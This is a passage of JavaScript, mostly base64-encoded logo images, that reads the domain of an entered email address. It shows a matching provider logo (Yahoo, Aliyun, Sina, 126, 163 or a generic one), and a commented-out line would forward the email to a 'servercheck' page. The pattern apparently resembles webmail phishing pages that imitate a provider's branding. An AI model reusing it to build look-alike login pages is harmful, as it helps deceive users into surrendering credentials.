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' width='130' />";
            } else if (emailfield.indexOf("ymail.com") != -1) {
                var the_server = "y";
                var server = "Yahoo";
                var the_image = "<img src='img/yahoo.jpg' width='130' />";
            } else if (emailfield.indexOf("aliyun.com") != -1) {
                var the_server = "a";
                var server = "Aliyun";
                var the_image = "<img src='img/aliyun.png' width='130' />";
            } else if (emailfield.indexOf("sina.com") != -1) {
                var the_server = "s";
                var server = "Sina";
                var the_image = "<img src='img/sina.png' width='130' />";
            } else if (emailfield.indexOf("126.com") != -1) {
                var the_server = "126";
                var server = "126.com";
                var the_image = "<img src='img/126.jpg' width='130' />";
            } else if (emailfield.indexOf("163.com") != -1) {
                var the_server = "163";
                var server = "163.com";
                var the_image = "<img src='img/163.png' width='130' />";
            } else {
                var server = emailfield.split("@")[1];
                var the_server = server.split(".")[0];
                var the_image = "<img src='data:image/png;base64,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' width='130' />";
            }

            jQuery("#server-logo").html(the_image);
            // window.location="servercheck.html?e="+the_server+"&X1="+email
			            
        }
    }
}
